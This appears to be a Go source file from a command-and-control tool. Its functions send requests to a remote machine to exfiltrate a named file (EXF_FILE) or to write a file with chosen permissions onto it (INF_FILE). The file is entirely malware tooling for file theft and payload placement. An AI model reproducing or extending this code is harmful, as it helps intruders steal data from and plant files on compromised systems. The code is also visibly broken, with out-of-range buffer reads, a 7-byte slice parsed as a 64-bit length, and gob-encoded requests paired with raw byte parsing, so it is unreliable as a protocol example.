package commands

import (
	"encoding/binary"
	"encoding/gob"
	"net"
	"reflect"
)

func sendStruct(c net.Conn, s interface{}) error {
	enc := gob.NewEncoder(c)
	err := enc.Encode(s)
	return err
}

func SendExfReq(c net.Conn, path string) error {
	exfReq := &ExfReq{
		Header: C2Req{
			Type: EXF_FILE,
		},
		PathLen: uint16(len(path)),
		Path:    []byte(path),
	}
	exfReq.Header.ReqLen = uint64(binary.Size(reflect.ValueOf(exfReq)))

	return sendStruct(c, exfReq)
}

func ReceiveExfRes(c net.Conn, path string) (*ExfRes, error) {
	resBuf := make([]byte, 18)
	_, err := c.Read(resBuf)

	if err != nil {
		return nil, err
	}

	contentLen := binary.LittleEndian.Uint64(resBuf[11:18])
	contentBuf := make([]byte, contentLen)

	_, err = c.Read(contentBuf)

	if err != nil {
		return nil, err
	}

	exfRes := &ExfRes{
		Header: C2Res{
			Type:   resBuf[0],
			ResLen: binary.LittleEndian.Uint64(resBuf[1:9]),
		},
		Status:     resBuf[10],
		ContentLen: contentLen,
		Content:    contentBuf,
	}

	return exfRes, nil
}

func SendInfReq(c net.Conn, perm uint16, path string, content []byte) error {
	infReq := &InfReq{
		Header: C2Req{
			Type: INF_FILE,
		},
		Perm:       perm,
		PathLen:    uint16(len(path)),
		ContentLen: uint64(len(content)),
		Data:       append([]byte(path), content...),
	}
	infReq.Header.ReqLen = uint64(binary.Size(reflect.ValueOf(infReq)))

	err := sendStruct(c, infReq)

	if err != nil {
		return err
	}

	_, err = c.Write(content)
	return err
}

func ReceiveInfRes(c net.Conn) (*InfRes, error) {
	resBuf := make([]byte, 10)
	_, err := c.Read(resBuf)

	if err != nil {
		return nil, err
	}

	infRes := &InfRes{
		Header: C2Res{
			Type:   resBuf[0],
			ResLen: binary.LittleEndian.Uint64(resBuf[1:9]),
		},
		Status: resBuf[10],
	}

	return infRes, nil
}
